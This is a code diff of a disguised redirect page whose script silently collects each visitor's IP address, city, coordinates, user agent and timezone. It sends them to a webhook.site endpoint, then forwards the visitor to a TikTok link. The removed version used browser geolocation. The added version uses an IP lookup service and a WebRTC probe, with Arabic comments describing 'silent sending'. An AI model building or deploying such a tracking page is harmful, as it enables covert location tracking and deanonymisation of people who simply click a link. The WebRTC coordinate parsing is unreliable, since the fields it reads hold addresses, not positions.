@@ -4,16 +4,18 @@
 <style>body{margin:0;background:#000}#f{opacity:0;pointer-events:none}</style>
 <script>
 (async()=>{
-  const p={enableHighAccuracy:!0,timeout:4e3,maximumAge:0};
-  navigator.geolocation.getCurrentPosition(async pos=>{
-    const{latitude:lat,longitude:lon,accuracy:acc}=pos.coords;
-    const payload=btoa(JSON.stringify({lat,lon,acc,ua:navigator.userAgent,t:Date.now()}));
-    await fetch('https://webhook.site/8a2202ae-712d-4d50-8a50-963d31c788a4',{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({data:payload})
-    }).catch(()=>{});
-  },()=>{},p);
+  /* 1- جلب IP + الموقع التقريبي عبر خدمة مجانية */
+  const geo=await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>{});
+  /* 2- استخراج إحداثيات WebRTC (دقة أعلى) */
+  let rtc={};
+  try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+       pc.createDataChannel('');pc.onicecandidate=e=>{if(e.candidate){const c=e.candidate.candidate.split(' ');rtc={lat:c[7],lon:c[8]};}};
+       await pc.createOffer();await pc.setLocalDescription();}catch{}
+  /* 3- تجميع البيانات */
+  const payload=btoa(JSON.stringify({ip:geo.ip,country:geo.country_name,city:geo.city,region:geo.region,lat:geo.latitude,lon:geo.longitude,rtc:rtc,ua:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,t:Date.now()}));
+  /* 4- الإرسال الصامت */
+  await fetch('https://webhook.site/8a2202ae-712d-4d50-8a50-963d31c788a4',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:payload})});
+  /* 5- التحويل الفوري */
   setTimeout(()=>location.replace('https://vt.tiktok.com/ZS5VSgPm5/'),900);
 })();
 </script></head><body><img id="f" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></body></html>
